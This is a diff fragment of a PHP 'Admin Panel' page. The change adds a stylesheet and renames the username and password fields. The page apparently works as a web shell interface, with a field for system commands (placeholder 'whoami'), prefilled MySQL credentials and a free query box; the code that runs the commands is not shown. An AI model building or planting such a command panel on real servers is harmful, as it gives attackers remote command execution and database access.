@@ -12,6 +12,7 @@ if($status == "1"){
 <html>
 <head>
 <title>Admin Panel</title>
+<link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
 <h1 style="text-align: center;">Admin Panel</h1>
@@ -22,8 +23,8 @@ if($status == "1"){
         SHELL: &nbsp;&nbsp;&ensp;&nbsp;&nbsp;<input type="text" id="query_box" name="query_box" placeholder="Ex: whoami"></input><br><br>
         DBNAM: &nbsp;&nbsp;&nbsp;<input type="text" id="mysql_get" name="mysql_get" placeholder="ex: custom" value="<?php echo $_SESSION[udb];?>"></input><br><br>
 	HOST : &ensp;&ensp;&ensp;<input type="text" id="host" name="host" placeholder="localhost" value="<?php echo $_SESSION['host'];?>"></input><br><br>
-	USER : &nbsp;&ensp;&ensp;&nbsp;<input type="text" id="user" name="user" value="<?php echo $_SESSION['mysql_user'];?>"></input><br><br>
-	PASS : &ensp;&nbsp;&ensp;&ensp;<input type="password" id="pass" name="pass" value="<?php echo $_SESSION['mysql_pass'];?>"></input></br><br>
+	USER : &nbsp;&ensp;&ensp;&nbsp;<input type="text" id="username" name="username" value="<?php echo $_SESSION['mysql_user'];?>"></input><br><br>
+	PASS : &ensp;&nbsp;&ensp;&ensp;<input type="password" id="password" name="password" value="<?php echo $_SESSION['mysql_pass'];?>"></input></br><br>
 	QUERY: &ensp;&nbsp;&nbsp;<input type="text" id="myquery" name="myquery" placeholder="SELECT * FROM test;" value="<?php echo $_SESSION['query'];?>"></input><br><br>
         <button type="Submit" value="Submit">Submit</button>
 
